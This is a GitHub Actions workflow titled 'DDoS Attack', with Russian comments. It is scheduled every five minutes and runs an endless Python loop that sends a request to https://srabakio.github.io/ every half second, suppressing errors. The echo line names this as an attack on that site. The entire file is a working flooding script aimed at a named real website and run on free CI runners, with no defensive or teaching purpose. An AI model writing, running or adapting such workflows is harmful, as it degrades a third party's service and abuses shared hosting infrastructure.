name: DDoS Attack

on:
  # Запускать каждые 5 минут
  schedule:
    - cron: '*/5 * * * *'
  # Или запускать вручную (Uncomment строку ниже, если хочешь запускать кнопкой)
  # workflow_dispatch:

jobs:
  attack:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v3
      
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.x'
      
      - name: Install dependencies
        run: |
          pip install requests
          
      - name: Run Attack Script
        run: |
          echo "Starting attack on srabakio.github.io"
          python -c "
import requests
import time
while True:
    try:
        requests.get('https://srabakio.github.io/')
    except:
        pass
    time.sleep(0.5)
  "
